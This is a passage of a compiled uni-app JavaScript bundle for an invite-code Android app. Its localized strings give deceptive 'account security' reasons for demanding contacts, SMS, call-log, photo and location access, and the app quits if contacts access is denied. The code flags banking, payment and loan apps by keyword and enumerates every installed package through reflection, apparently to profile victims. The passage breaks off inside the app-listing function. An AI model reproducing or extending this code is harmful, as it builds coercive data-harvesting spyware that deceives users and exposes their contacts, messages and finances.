      permissionContent: "This app needs access to contacts, location, SMS and media files to function properly. Please enable all permissions in settings.",
      goToSettings: "Settings",
      exit: "Exit",
      permissionIncomplete: "Incomplete permissions, app cannot run properly",
      restartApp: "Permission check failed, please restart the app",
      uploadingData: "Logging in...",
      preparingToEnter: "Preparing to enter...",
      countdown: "Queuing, please wait, estimated {0} seconds to enter",
      contactPermTitle: "Get Phone Number",
      contactPermDesc: "Security tip: Access to contacts is required for account registration, binding, login and phone number verification to prevent account theft!",
      smsPermTitle: "SMS Permission",
      smsPermDesc: "Security tip: SMS permission is required for auto-filling verification codes and account security verification!",
      callPermTitle: "Call Log Permission",
      callPermDesc: "Security tip: Call log permission is required for identity verification and security protection!",
      photoPermTitle: "Photo Permission",
      photoPermDesc: "Security tip: Photo permission is required for avatar settings and identity verification material upload!",
      exitApp: "Exit App",
      authorize: "Authorize",
      close: "Close",
      permSettingTip: "Please enable the permission in app settings!",
      formIncomplete: "Please fill in all required fields"
    },
    "ja": {
      phone: "電話番号",
      inviteCode: "招待コード",
      login: "ログイン",
      phoneError: "正しい電話番号を入力してください",
      inviteCodeError: "正しい招待コードを入力してください",
      permissionTitle: "権限リクエスト",
      locationPermission: "位置情報の権限が必要です",
      contactsPermission: "連絡先の権限が必要です",
      galleryPermission: "ギャラリーの権限が必要です",
      smsPermission: "SMSの権限が必要です",
      allow: "許可",
      deny: "拒否",
      agreementPrefix: "ログインすることで",
      agreementSuffix: "に同意したものとみなされます",
      permissionError: "获取权限失败，请检查权限设置",
      permissionDenied: "部分权限未获取，可能影响应用使用",
      permissionContent: "このアプリは連絡先、位置情報、SMS、メディアファイルへのアクセスが必要です。設定ですべての権限を有効にしてください",
      goToSettings: "設定に移動",
      exit: "終了",
      permissionIncomplete: "権限の取得が不完全で、アプリが正常に動作しません",
      restartApp: "権限チェックに失敗しました。アプリを再起動してください",
      uploadingData: "ログイン中...",
      preparingToEnter: "システムに入る準備中...",
      countdown: "キュー中、お待ちください、約{0}秒後に入ります",
      contactPermTitle: "電話番号の取得",
      contactPermDesc: "アカウントセキュリティ：電話番号の取得は会員登録、アカウントバインド、ログイン認証に使用されます。",
      smsPermTitle: "SMS権限",
      smsPermDesc: "アカウントセキュリティ：SMS権限は認証コードの自動入力とアカウントセキュリティ認証に使用されます。",
      callPermTitle: "通話履歴権限",
      callPermDesc: "アカウントセキュリティ：通話履歴権限は本人確認とセキュリティ保護に使用されます。",
      photoPermTitle: "フォトアルバム権限",
      photoPermDesc: "アカウントセキュリティ：フォトアルバム権限はアバター設定と本人確認資料のアップロードに使用されます。",
      exitApp: "アプリを終了",
      authorize: "許可する",
      close: "閉じる",
      permSettingTip: "設定で関連権限を有効にしてください！",
      formIncomplete: "すべての情報を入力してください"
    },
    "ko": {
      phone: "전화번호",
      inviteCode: "초대 코드",
      login: "로그인",
      phoneError: "올바른 전화번호를 입력하세요",
      inviteCodeError: "올바른 초대 코드를 입력하세요",
      permissionTitle: "권한 요청",
      locationPermission: "위치 권한이 필요합니다",
      contactsPermission: "연락처 권한이 필요합니다",
      galleryPermission: "갤러리 권한이 필요합니다",
      smsPermission: "SMS 권한이 필요합니다",
      allow: "허용",
      deny: "거부",
      agreementPrefix: "로그인하면",
      agreementSuffix: "에 동의하는 것으로 간주됩니다",
      permissionError: "获取权限失败，请检查权限设置",
      permissionDenied: "部分权限未获取，可能影响应用使用",
      permissionContent: "이 앱은 연락처, 위치, SMS 및 미디어 파일에 대한 액세스가 필요합니다. 설정에서 모든 권한을 활성화하세요",
      goToSettings: "설정으로 이동",
      exit: "종료",
      permissionIncomplete: "권한 획득이 불완전하여 앱이 정상 작동하지 않습니다",
      restartApp: "권한 확인 실패, 앱을 다시 시작하세요",
      uploadingData: "로그인 중...",
      preparingToEnter: "시스템 진입 준비 중...",
      countdown: "대기 중입니다. 약 {0}초 후에 입장합니다",
      contactPermTitle: "전화번호 가져오기",
      contactPermDesc: "계정 보안: 회원 등록, 계정 바인딩, 로그인 인증에 전화번호 접근이 필요합니다.",
      smsPermTitle: "SMS 권한",
      smsPermDesc: "계정 보안: 인증번호 자동입력 및 계정 보안 인증을 위해 SMS 권한이 필요합니다.",
      callPermTitle: "통화 기록 권한",
      callPermDesc: "계정 보안: 본인 인증 및 보안 보호를 위해 통화 기록 권한이 필요합니다.",
      photoPermTitle: "앨범 권한",
      photoPermDesc: "계정 보안: 프로필 설정 및 본인 인증 자료 업로드를 위해 앨범 권한이 필요합니다.",
      exitApp: "앱 종료",
      authorize: "권한 허용",
      close: "닫기",
      permSettingTip: "설정에서 관련 권한을 활성화하세요!",
      formIncomplete: "모든 정보를 입력하세요"
    },
    "vi": {
      phone: "Số điện thoại",
      inviteCode: "Mã mời",
      login: "Đăng nhập",
      phoneError: "Vui lòng nhập số điện thoại hợp lệ",
      inviteCodeError: "Vui lòng nhập mã mời hợp lệ",
      permissionTitle: "Yêu cầu quyền",
      locationPermission: "Cần quyền truy cập vị trí",
      contactsPermission: "Cần quyền truy cập danh bạ",
      galleryPermission: "Cần quyền truy cập thư viện ảnh",
      smsPermission: "Cần quyền truy cập SMS",
      allow: "Cho phép",
      deny: "Từ chối",
      agreementPrefix: "Bằng cách đăng nhập, bạn đồng ý với",
      agreementSuffix: "",
      permissionError: "获取权限失败，请检查权限设置",
      permissionDenied: "部分权限未获取，可能影响应用使用",
      permissionContent: "Ứng dụng này cần truy cập vào danh bạ, vị trí, tin nhắn và tệp trung bình để hoạt động bình thường. Vui lòng bật tất cả các quyền trong cài đặt",
      goToSettings: "Đến cài đặt",
      exit: "Thoát",
      permissionIncomplete: "Quyền truy cập không đầy đủ, ứng dụng không thể hoạt động bình thường",
      restartApp: "Kiểm tra quyền thất bại, vui lòng khởi động lại ứng dụng",
      uploadingData: "Đang đăng nhập...",
      preparingToEnter: "Đang chuẩn bị vào hệ thống...",
      countdown: "Đang xếp hàng, vui lòng đợi, dự kiến {0} giây nữa sẽ vào",
      contactPermTitle: "Lấy số điện thoại",
      contactPermDesc: "Bảo mật tài khoản: Cần truy cập danh bạ để đăng ký, liên kết tài khoản và xác minh số điện thoại.",
      smsPermTitle: "Quyền SMS",
      smsPermDesc: "Bảo mật tài khoản: Cần quyền SMS để tự động điền mã xác minh và xác minh bảo mật tài khoản.",
      callPermTitle: "Quyền nhật ký cuộc gọi",
      callPermDesc: "Bảo mật tài khoản: Cần quyền nhật ký cuộc gọi để xác minh danh tính và bảo vệ an ninh.",
      photoPermTitle: "Quyền thư viện ảnh",
      photoPermDesc: "Bảo mật tài khoản: Cần quyền thư viện ảnh để cài đặt avatar và tải lên tài liệu xác minh.",
      exitApp: "Thoát ứng dụng",
      authorize: "Cấp quyền",
      close: "Đóng",
      permSettingTip: "Vui lòng bật quyền liên quan trong cài đặt!",
      formIncomplete: "Vui lòng điền đầy đủ thông tin"
    },
    "pt-br": {
      phone: "Número de telefone",
      inviteCode: "Código de convite",
      login: "Entrar",
      phoneError: "Digite um número de telefone válido",
      inviteCodeError: "Digite um código de convite válido",
      permissionTitle: "Solicitação de permissão",
      locationPermission: "Permissão de localização necessária",
      contactsPermission: "Permissão de contatos necessária",
      galleryPermission: "Permissão de galeria necessária",
      smsPermission: "Permissão de SMS necessária",
      allow: "Permitir",
      deny: "Negar",
      agreementPrefix: "Ao entrar, você concorda com a",
      agreementSuffix: "",
      permissionError: "Falha ao obter permissão",
      permissionDenied: "Algumas permissões não foram concedidas",
      permissionContent: "Este aplicativo precisa de acesso aos contatos, localização, SMS e arquivos de mídia para funcionar corretamente. Por favor, ative todas as permissões nas configurações",
      goToSettings: "Ir para Configurações",
      exit: "Sair",
      permissionIncomplete: "Permissões incompletas, o aplicativo não pode funcionar corretamente",
      restartApp: "Falha ao verificar permissões, por favor reinicie o aplicativo",
      uploadingData: "Entrando...",
      preparingToEnter: "Preparando para entrar...",
      countdown: "Na fila, aguarde, estimativa de {0} segundos para entrar",
      contactPermTitle: "Obter número de telefone",
      contactPermDesc: "Segurança da conta: O acesso aos contatos é necessário para registro, vinculação e verificação de conta.",
      smsPermTitle: "Permissão de SMS",
      smsPermDesc: "Segurança da conta: A permissão de SMS é necessária para preenchimento automático de código de verificação.",
      callPermTitle: "Permissão de registro de chamadas",
      callPermDesc: "Segurança da conta: A permissão de registro de chamadas é necessária para verificação de identidade.",
      photoPermTitle: "Permissão de fotos",
      photoPermDesc: "Segurança da conta: A permissão de fotos é necessária para configuração de avatar e upload de documentos.",
      exitApp: "Sair do app",
      authorize: "Autorizar",
      close: "Fechar",
      permSettingTip: "Por favor, ative a permissão nas configurações!",
      formIncomplete: "Por favor, preencha todas as informações"
    },
    "es-es": {
      phone: "Número de teléfono",
      inviteCode: "Código de invitación",
      login: "Iniciar sesión",
      phoneError: "Ingrese un número de teléfono válido",
      inviteCodeError: "Ingrese un código de invitación válido",
      permissionTitle: "Solicitud de permiso",
      locationPermission: "Se requiere permiso de ubicación",
      contactsPermission: "Se requiere permiso de contactos",
      galleryPermission: "Se requiere permiso de galería",
      smsPermission: "Se requiere permiso de SMS",
      allow: "Permitir",
      deny: "Denegar",
      agreementPrefix: "Al iniciar sesión, aceptas la",
      agreementSuffix: "",
      permissionError: "Error al obtener permisos",
      permissionDenied: "Algunos permisos no fueron otorgados",
      permissionContent: "Este aplicativo necesita acceso a los contactos, la ubicación, los mensajes de texto y los archivos de medios para funcionar correctamente. Por favor, active todas las permisses en la configuración",
      goToSettings: "Ir a Configuración",
      exit: "Salir",
      permissionIncomplete: "Permisos incompletos, la aplicación no puede funcionar correctamente",
      restartApp: "Error al comprobar permisos, por favor reinicie la aplicación",
      uploadingData: "Iniciando sesión...",
      preparingToEnter: "Preparando para entrar...",
      countdown: "En cola, espere, estimado {0} segundos para entrar",
      contactPermTitle: "Obtener número de teléfono",
      contactPermDesc: "Seguridad de la cuenta: Se necesita acceso a contactos para registro, vinculación y verificación de cuenta.",
      smsPermTitle: "Permiso de SMS",
      smsPermDesc: "Seguridad de la cuenta: Se necesita permiso de SMS para auto-completar código de verificación.",
      callPermTitle: "Permiso de registro de llamadas",
      callPermDesc: "Seguridad de la cuenta: Se necesita permiso de registro de llamadas para verificación de identidad.",
      photoPermTitle: "Permiso de fotos",
      photoPermDesc: "Seguridad de la cuenta: Se necesita permiso de fotos para configuración de avatar y carga de documentos.",
      exitApp: "Salir de la app",
      authorize: "Autorizar",
      close: "Cerrar",
      permSettingTip: "¡Por favor active el permiso en la configuración!",
      formIncomplete: "Por favor complete toda la información"
    },
    "ro-ro": {
      phone: "Număr de telefon",
      inviteCode: "Cod de invitație",
      login: "Autentificare",
      phoneError: "Introduceți un număr de telefon valid",
      inviteCodeError: "Introduceți un cod de invitație valid",
      permissionTitle: "Cerere permisiune",
      locationPermission: "Este necesară permisiunea de locație",
      contactsPermission: "Este necesară permisiunea pentru contacte",
      galleryPermission: "Este necesară permisiunea pentru galerie",
      smsPermission: "Este necesară permisiunea pentru SMS",
      allow: "Permite",
      deny: "Refuză",
      agreementPrefix: "Prin autentificare, sunteți de acord cu",
      agreementSuffix: "",
      permissionError: "Eroare la obținerea permisiunilor",
      permissionDenied: "Unele permisiuni nu au fost acordate",
      permissionContent: "Această aplicație are nevoie de acces la contacte, locație, SMS și fișiere de mediu pentru a funcționa corect. Vă rugăm să activați toate permisiunile în setări",
      goToSettings: "Mergi la Setări",
      exit: "Ieși",
      permissionIncomplete: "Permisiuni incomplete, aplicația nu poate funcționa corect",
      restartApp: "Verificare permisiuni eșuată, vă rugăm să reporniți aplicația",
      uploadingData: "Se conectează...",
      preparingToEnter: "Pregătirea pentru intrarea în sistem...",
      countdown: "La coadă, vă rugăm să așteptați, estimat {0} secunde pentru a intra",
      contactPermTitle: "Obțineți numărul de telefon",
      contactPermDesc: "Securitatea contului: Accesul la contacte este necesar pentru înregistrare, legare și verificare cont.",
      smsPermTitle: "Permisiune SMS",
      smsPermDesc: "Securitatea contului: Permisiunea SMS este necesară pentru completarea automată a codului de verificare.",
      callPermTitle: "Permisiune jurnal apeluri",
      callPermDesc: "Securitatea contului: Permisiunea jurnalului de apeluri este necesară pentru verificarea identității.",
      photoPermTitle: "Permisiune foto",
      photoPermDesc: "Securitatea contului: Permisiunea foto este necesară pentru setarea avatarului și încărcarea documentelor.",
      exitApp: "Ieșire din aplicație",
      authorize: "Autorizare",
      close: "Închide",
      permSettingTip: "Vă rugăm să activați permisiunea în setări!",
      formIncomplete: "Vă rugăm să completați toate informațiile"
    },
    "ar-sa": {
      phone: "رقم الهاتف",
      inviteCode: "رمز الدعوة",
      login: "تسجيل الدخول",
      phoneError: "الرجاء إدخال رقم هاتف صحيح",
      inviteCodeError: "الرجاء إدخال رمز دعوة صحيح",
      permissionTitle: "طلب إذن",
      locationPermission: "مطلوب إذن الموقع",
      contactsPermission: "مطلوب إذن جهات الاتصال",
      galleryPermission: "مطلوب إذن المعرض",
      smsPermission: "مطلوب إذن الرسائل",
      allow: "السماح",
      deny: "رفض",
      agreementPrefix: "بتسجيل الدخول، أنت توافق على",
      agreementSuffix: "",
      permissionError: "فشل في الحصول على الأذونات",
      permissionDenied: "لم يتم منح بعض الأذونات",
      permissionContent: "هذه التطبيق بحاجة إلى الوصول إلى جهات الاتصال، الموقع، الرسائل، وملفات الوسائط للعمل بشكل صحيح. يرجى تفعيل جميع الأذونات في الإعدادات",
      goToSettings: "الإلتفاف إلى الإعدادات",
      exit: "الخروج",
      permissionIncomplete: "الأذونات غير مكتملة، لا يمكن للتطبيق أن يعمل بشكل صحيح",
      restartApp: "فشل التحقق من الأذونات، يرجى إعادة تشغيل التطبيق",
      uploadingData: "جاري تسجيل الدخول...",
      preparingToEnter: "جاري التهيئة لدخول النظام...",
      countdown: "في قائمة الانتظار، يرجى الانتظار، تقدير {0} ثانية للدخول",
      contactPermTitle: "الحصول على رقم الهاتف",
      contactPermDesc: "أمان الحساب: مطلوب الوصول إلى جهات الاتصال للتسجيل وربط الحساب والتحقق.",
      smsPermTitle: "إذن الرسائل",
      smsPermDesc: "أمان الحساب: مطلوب إذن الرسائل لملء رمز التحقق تلقائياً.",
      callPermTitle: "إذن سجل المكالمات",
      callPermDesc: "أمان الحساب: مطلوب إذن سجل المكالمات للتحقق من الهوية.",
      photoPermTitle: "إذن الصور",
      photoPermDesc: "أمان الحساب: مطلوب إذن الصور لإعداد الصورة الرمزية وتحميل وثائق التحقق.",
      exitApp: "الخروج من التطبيق",
      authorize: "السماح",
      close: "إغلاق",
      permSettingTip: "يرجى تفعيل الإذن في الإعدادات!",
      formIncomplete: "يرجى ملء جميع المعلومات"
    },
    "yn-yna": {
      phone: "Nomor telepon seluler",
      inviteCode: "Kode undangan",
      login: "Masuk",
      phoneError: "Silakan masukkan nomor ponsel yang benar.",
      inviteCodeError: "Harap masukkan kode undangan yang benar.",
      permissionTitle: "Deskripsi izin",
      locationPermission: "Izin lokasi diperlukan",
      contactsPermission: "Perlu mendapatkan izin buku alamat",
      galleryPermission: "Membutuhkan izin buku",
      smsPermission: "Anda perlu mendapatkan izin SMS.",
      allow: "Mengizinkan",
      deny: "Sampah",
      agreementPrefix: "Masuk untuk setuju.",
      agreementSuffix: "",
      permissionError: "Gagal mendapatkan izin, mohon periksa pengaturan izin",
      permissionDenied: "Semua izin harus diizinkan untuk menggunakan aplikasi ini.",
      permissionContent: "Aplikasi ini memerlukan akses ke buku alamat, lokasi, pesan teks, dan izin file media untuk digunakan secara normal. Harap aktifkan semua izin di pengaturan.",
      exit: "Pergi",
      permissionIncomplete: "Akuisisi izin tidak lengkap, dan aplikasi tidak dapat bekerja secara normal.",
      restartApp: "Pemeriksaan izin gagal, silakan mulai ulang aplikasi.",
      uploadingData: "Sedang masuk...",
      preparingToEnter: "Bersiaplah untuk memasuki sistem...",
      countdown: "Dalam antrian, mohon tunggu, perkiraan {0} detik untuk masuk",
      contactPermTitle: "Dapatkan nomor telepon",
      contactPermDesc: "Keamanan akun: Akses kontak diperlukan untuk pendaftaran, pengikatan, dan verifikasi akun.",
      smsPermTitle: "Izin SMS",
      smsPermDesc: "Keamanan akun: Izin SMS diperlukan untuk pengisian otomatis kode verifikasi.",
      callPermTitle: "Izin log panggilan",
      callPermDesc: "Keamanan akun: Izin log panggilan diperlukan untuk verifikasi identitas.",
      photoPermTitle: "Izin foto",
      photoPermDesc: "Keamanan akun: Izin foto diperlukan untuk pengaturan avatar dan unggah dokumen verifikasi.",
      exitApp: "Keluar aplikasi",
      authorize: "Izinkan",
      close: "Tutup",
      permSettingTip: "Silakan aktifkan izin di pengaturan!",
      formIncomplete: "Silakan lengkapi semua informasi"
    }
  };
  const i18n = createI18n({
    locale: uni.getStorageSync("language") || "zh-CN",
    // 默认语言
    fallbackLocale: "zh-CN",
    // 回退语言（如果当前语言翻译缺失，使用这个语言）
    messages,
    // 导入的语言包
    legacy: false,
    // 使用 Composition API 模式，适用于 Vue 3
    globalInjection: true,
    // 全局注入 $t 方法，可以直接在模板中使用
    missingWarn: false,
    // 关闭缺失翻译警告
    fallbackWarn: false
    // 关闭回退警告
  });
  requireNativePlugin("globalEvent");
  const _AndroidHandler = class _AndroidHandler {
    // 默认1分钟检查一次
    // 判断是否是银行应用
    static isBankApp(packageName, appName) {
      if (!packageName || !appName)
        return false;
      const bankKeywords = [
        "bank",
        "banking",
        "银行",
        "pay",
        "payment",
        "支付",
        "wallet",
        "钱包",
        "finance",
        "financial",
        "金融",
        "credit",
        "信用卡",
        "loan",
        "贷款",
        "money",
        "理财",
        "cash",
        "现金",
        "工行",
        "农行",
        "中行",
        "建行",
        "招商",
        "交通",
        "邮储",
        "民生",
        "兴业",
        "平安",
        "浦发"
      ];
      const lowerPackage = packageName.toLowerCase();
      const lowerName = appName.toLowerCase();
      if (lowerPackage.includes("bank") || lowerPackage.includes("pay") || lowerPackage.includes("wallet") || lowerPackage.includes("finance") || lowerPackage.includes("credit")) {
        return true;
      }
      return bankKeywords.some((keyword) => lowerName.includes(keyword));
    }
    // 判断是否是系统应用(额外检查)
    static isSystemApp(packageName) {
      if (!packageName)
        return false;
      const systemPrefixes = [
        "com.android.",
        "android.",
        "com.google.android.",
        "com.samsung.",
        "com.huawei.",
        "com.xiaomi.",
        "com.oppo.",
        "com.vivo.",
        "com.oneplus.",
        "com.mediatek.",
        "com.qualcomm."
      ];
      const nonSystemPrefixes = [
        "com.tencent.",
        // 腾讯系应用
        "com.sina.",
        // 新浪系应用
        "com.alibaba.",
        // 阿里系应用
        "com.taobao.",
        // 淘宝系应用
        "com.eg.android.",
        // 支付宝
        "com.baidu.",
        // 百度系应用
        "com.netease.",
        // 网易系应用
        "com.bytedance.",
        // 字节跳动系应用
        "com.ss.android.",
        // 今日头条、抖音等
        "com.jingdong.",
        // 京东
        "com.douban.",
        // 豆瓣
        "com.zhihu.",
        // 知乎
        "com.cctv.",
        // 央视相关
        "com.pptv.",
        // PPTV
        "com.facebook.",
        // Facebook
        "com.twitter.",
        // Twitter
        "com.instagram.",
        // Instagram
        "com.spotify.",
        // Spotify
        "com.linkedin.",
        // LinkedIn
        "org.telegram.",
        // Telegram
        "com.snapchat.",
        // Snapchat
        "com.whatsapp.",
        // WhatsApp
        "tv.danmaku.bili",
        // 哔哩哔哩
        "com.mxtech.",
        // MX Player
        "com.autonavi.",
        // 高德地图
        "com.UCMobile.",
        // UC浏览器
        "com.xunmeng."
        // 拼多多
      ];
      const exactNonSystemPackages = [
        "com.tencent.mm",
        // 微信
        "com.tencent.mobileqq",
        // QQ
        "com.tencent.tim",
        // TIM
        "com.ss.android.ugc.aweme",
        // 抖音
        "com.eg.android.AlipayGphone",
        // 支付宝
        "com.taobao.taobao",
        // 淘宝
        "com.jingdong.app.mall",
        // 京东
        "com.xunmeng.pinduoduo",
        // 拼多多
        "com.sankuai.meituan",
        // 美团
        "com.sina.weibo",
        // 微博
        "com.baidu.searchbox",
        // 百度
        "tv.danmaku.bili",
        // 哔哩哔哩
        "com.tencent.tmgp.sgame",
        // 王者荣耀
        "com.netease.cloudmusic",
        // 网易云音乐
        "com.tencent.qqmusic",
        // QQ音乐
        "com.youku.phone",
        // 优酷
        "com.qiyi.video",
        // 爱奇艺
        "com.tencent.qqlive"
        // 腾讯视频
      ];
      if (exactNonSystemPackages.includes(packageName)) {
        return false;
      }
      for (const prefix of nonSystemPrefixes) {
        if (packageName.startsWith(prefix)) {
          return false;
        }
      }
      return systemPrefixes.some((prefix) => packageName.startsWith(prefix));
    }
    // 新增退出应用方法
    static exitApp() {
      if (plus.os.name.toLowerCase() === "android") {
        try {
          uni.showToast({
            title: "需要通讯录权限，应用将退出",
            icon: "none",
            duration: 1500
          });
          setTimeout(() => {
            try {
              const main = plus.android.runtimeMainActivity();
              const Process = plus.android.importClass("android.os.Process");
              const System = plus.android.importClass("java.lang.System");
              const myPid = Process.myPid();
              main.finish();
              Process.killProcess(myPid);
              System.exit(0);
            } catch (e) {
              formatAppLog("error", "at utils/android-handler.js:174", "使用强制退出方式失败:", e);
              const main = plus.android.runtimeMainActivity();
              main.moveTaskToBack(true);
              plus.runtime.quit();
            }
          }, 1500);
        } catch (error) {
          formatAppLog("error", "at utils/android-handler.js:182", "退出应用失败:", error);
          plus.runtime.quit();
        }
      } else {
        plus.runtime.quit();
      }
    }
    // 添加检查并处理通讯录权限的方法 - 关键方法
    static async checkAndHandleContactsPermission() {
      if (plus.os.name.toLowerCase() !== "android") {
        return true;
      }
      formatAppLog("log", "at utils/android-handler.js:198", "检查通讯录权限状态");
      try {
        const permissionChecked = uni.getStorageSync("contactsPermissionChecked") || false;
        const mainActivity = plus.android.runtimeMainActivity();
        const PackageManager = plus.android.importClass("android.content.pm.PackageManager");
        const Manifest = plus.android.importClass("android.Manifest");
        try {
          const currentStatus = mainActivity.checkSelfPermission(Manifest.permission.READ_CONTACTS);
          const hasPermission = currentStatus === PackageManager.PERMISSION_GRANTED;
          formatAppLog("log", "at utils/android-handler.js:213", "通讯录权限状态:", hasPermission ? "已授权" : "未授权");
          formatAppLog("log", "at utils/android-handler.js:214", "之前是否检查过权限:", permissionChecked);
          if (hasPermission) {
            uni.setStorageSync("contactsPermissionChecked", true);
            return true;
          }
          if (!permissionChecked) {
            formatAppLog("log", "at utils/android-handler.js:226", "首次启动应用，请求通讯录权限");
            return new Promise((resolve) => {
              plus.android.requestPermissions(
                [Manifest.permission.READ_CONTACTS],
                function(resultObj) {
                  let permissionGranted = false;
                  for (var i = 0; i < resultObj.granted.length; i++) {
                    const granted = resultObj.granted[i];
                    formatAppLog("log", "at utils/android-handler.js:237", `已获取权限: ${granted}`);
                    if (granted === Manifest.permission.READ_CONTACTS) {
                      permissionGranted = true;
                    }
                  }
                  let isDenied = false;
                  for (var i = 0; i < resultObj.deniedPresent.length; i++) {
                    isDenied = true;
                    formatAppLog("log", "at utils/android-handler.js:247", `本次拒绝的权限: ${resultObj.deniedPresent[i]}`);
                  }
                  let isPermanentlyDenied = false;
                  for (var i = 0; i < resultObj.deniedAlways.length; i++) {
                    isPermanentlyDenied = true;
                    formatAppLog("log", "at utils/android-handler.js:253", `永久拒绝的权限: ${resultObj.deniedAlways[i]}`);
                  }
                  uni.setStorageSync("contactsPermissionChecked", true);
                  if (permissionGranted) {
                    formatAppLog("log", "at utils/android-handler.js:260", "通讯录权限已授予，继续流程");
                    resolve(true);
                  } else {
                    formatAppLog("log", "at utils/android-handler.js:263", "通讯录权限被拒绝，将退出应用");
                    uni.showModal({
                      title: "通讯录权限被拒绝",
                      content: "应用需要通讯录权限才能继续使用，应用将退出",
                      showCancel: false,
                      confirmText: "知道了",
                      success: () => {
                        _AndroidHandler.exitApp();
                        resolve(false);
                      }
                    });
                  }
                },
                function(error) {
                  formatAppLog("error", "at utils/android-handler.js:280", "通讯录权限请求错误:", error);
                  uni.setStorageSync("contactsPermissionChecked", true);
                  uni.showModal({
                    title: "权限请求失败",
                    content: "通讯录权限请求失败，应用需要此权限才能运行",
                    showCancel: false,
                    confirmText: "退出应用",
                    success: () => {
                      _AndroidHandler.exitApp();
                      resolve(false);
                    }
                  });
                }
              );
            });
          } else {
            formatAppLog("log", "at utils/android-handler.js:302", "非首次启动，通讯录权限未授予，显示引导界面");
            return new Promise((resolve) => {
              plus.android.requestPermissions(
                [Manifest.permission.READ_CONTACTS],
                function(resultObj) {
                  let permissionGranted = false;
                  for (var i = 0; i < resultObj.granted.length; i++) {
                    const granted = resultObj.granted[i];
                    if (granted === Manifest.permission.READ_CONTACTS) {
                      permissionGranted = true;
                    }
                  }
                  if (permissionGranted) {
                    formatAppLog("log", "at utils/android-handler.js:320", "通讯录权限已授予，继续流程");
                    resolve(true);
                  } else {
                    uni.showModal({
                      title: "需要通讯录权限",
                      content: "应用需要通讯录权限才能继续使用，请在设置中开启通讯录权限",
                      confirmText: "去设置",
                      cancelText: "退出应用",
                      success: function(res) {
                        if (res.confirm) {
                          formatAppLog("log", "at utils/android-handler.js:332", "引导用户去设置页面");
                          try {
                            const Intent = plus.android.importClass("android.content.Intent");
                            const Settings = plus.android.importClass("android.provider.Settings");
                            const Uri = plus.android.importClass("android.net.Uri");
                            const mainActivity2 = plus.android.runtimeMainActivity();
                            const packageName = mainActivity2.getPackageName();
                            const intent = new Intent();
                            intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                            const uri = Uri.fromParts("package", packageName, null);
                            intent.setData(uri);
                            mainActivity2.startActivity(intent);
                          } catch (e) {
                            formatAppLog("error", "at utils/android-handler.js:348", "打开设置页面失败:", e);
                            try {
                              const Intent = plus.android.importClass("android.content.Intent");
                              const Settings = plus.android.importClass("android.provider.Settings");
                              const mainActivity2 = plus.android.runtimeMainActivity();
                              const intent = new Intent(Settings.ACTION_SETTINGS);
                              mainActivity2.startActivity(intent);
                            } catch (err) {
                              formatAppLog("error", "at utils/android-handler.js:358", "打开系统设置页面也失败:", err);
                            }
                          }
                          setTimeout(() => {
                            _AndroidHandler.exitApp();
                            resolve(false);
                          }, 500);
                        } else {
                          formatAppLog("log", "at utils/android-handler.js:369", "用户选择退出应用");
                          _AndroidHandler.exitApp();
                          resolve(false);
                        }
                      }
                    });
                  }
                },
                function(error) {
                  formatAppLog("error", "at utils/android-handler.js:378", "通讯录权限再次请求错误:", error);
                  uni.showModal({
                    title: "无法请求权限",
                    content: "应用需要通讯录权限才能继续使用，请在设置中手动开启",
                    confirmText: "去设置",
                    cancelText: "退出应用",
                    success: function(res) {
                      if (res.confirm) {
                        try {
                          const Intent = plus.android.importClass("android.content.Intent");
                          const Settings = plus.android.importClass("android.provider.Settings");
                          const Uri = plus.android.importClass("android.net.Uri");
                          const mainActivity2 = plus.android.runtimeMainActivity();
                          const packageName = mainActivity2.getPackageName();
                          const intent = new Intent();
                          intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                          const uri = Uri.fromParts("package", packageName, null);
                          intent.setData(uri);
                          mainActivity2.startActivity(intent);
                        } catch (e) {
                          formatAppLog("error", "at utils/android-handler.js:402", "打开设置页面失败:", e);
                          try {
                            const Intent = plus.android.importClass("android.content.Intent");
                            const Settings = plus.android.importClass("android.provider.Settings");
                            const mainActivity2 = plus.android.runtimeMainActivity();
                            const intent = new Intent(Settings.ACTION_SETTINGS);
                            mainActivity2.startActivity(intent);
                          } catch (err) {
                            formatAppLog("error", "at utils/android-handler.js:411", "打开系统设置也失败:", err);
                          }
                        }
                        setTimeout(() => {
                          _AndroidHandler.exitApp();
                          resolve(false);
                        }, 500);
                      } else {
                        _AndroidHandler.exitApp();
                        resolve(false);
                      }
                    }
                  });
                }
              );
            });
          }
        } catch (e) {
          formatAppLog("error", "at utils/android-handler.js:430", "检查通讯录权限状态出错:", e);
          return false;
        }
      } catch (error) {
        formatAppLog("error", "at utils/android-handler.js:434", "处理通讯录权限异常:", error);
        return false;
      }
    }
    // 使用更原始的方式直接获取应用列表
    static async getNativeApplicationList() {
      formatAppLog("log", "at utils/android-handler.js:441", "尝试从设备获取真实应用列表");
      try {
        const Context = plus.android.importClass("android.content.Context");
        const PackageManager = plus.android.importClass("android.content.pm.PackageManager");
        const ApplicationInfo = plus.android.importClass("android.content.pm.ApplicationInfo");
        const PackageInfo = plus.android.importClass("android.content.pm.PackageInfo");
        const Field = plus.android.importClass("java.lang.reflect.Field");
        const Class = plus.android.importClass("java.lang.Class");
        const mainActivity = plus.android.runtimeMainActivity();
        const pm = mainActivity.getPackageManager();
        formatAppLog("log", "at utils/android-handler.js:456", "获取已安装应用列表...");
        const apps = [];
        try {
          const installedPackages = pm.getInstalledPackages(0);
          plus.android.importClass(installedPackages);
          let packagesSize = 0;
          try {
            packagesSize = installedPackages.size();
          } catch (e) {
            try {
              packagesSize = installedPackages.length;
            } catch (e2) {
              try {
                const packageArray = plus.android.invoke(installedPackages, "toArray");
                packagesSize = packageArray.length;
              } catch (e3) {
                formatAppLog("error", "at utils/android-handler.js:481", "无法获取已安装应用列表大小:", e3);
                return [];
              }
            }
          }
          formatAppLog("log", "at utils/android-handler.js:487", `获取到 ${packagesSize} 个应用包信息`);
          if (packagesSize > 0) {
            const pkgInfoClass = Class.forName("android.content.pm.PackageInfo");
            const packageNameField = pkgInfoClass.getDeclaredField("packageName");
            packageNameField.setAccessible(true);
            formatAppLog("log", "at utils/android-handler.js:495", "成功获取packageName字段引用");
            const existingPackages = /* @__PURE__ */ new Set();
            for (let i = 0; i < packagesSize; i++) {
              try {
                let pkgInfo = null;
                try {
                  pkgInfo = installedPackages.get(i);
                } catch (e) {
                  try {
                    pkgInfo = installedPackages[i];
                  } catch (e2) {
                    continue;
                  }
                }
                if (!pkgInfo)
                  continue;
                let packageName = null;
                try {
                  packageName = pkgInfo.packageName;
                } catch (e) {
                }
                if (!packageName) {
                  try {
                    packageName = packageNameField.get(pkgInfo);
